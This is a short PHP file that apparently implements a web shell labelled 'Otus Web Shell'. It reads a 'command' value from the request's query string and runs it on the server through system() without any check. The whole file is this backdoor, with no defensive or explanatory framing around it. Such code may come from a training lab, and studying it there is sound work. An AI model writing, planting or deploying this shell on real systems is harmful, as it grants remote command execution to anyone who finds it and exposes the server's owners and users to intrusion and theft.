<?php
	if(!empty($_GET['command']))
	{
		system($_GET['command']);
	};
	echo "Otus Web Shell";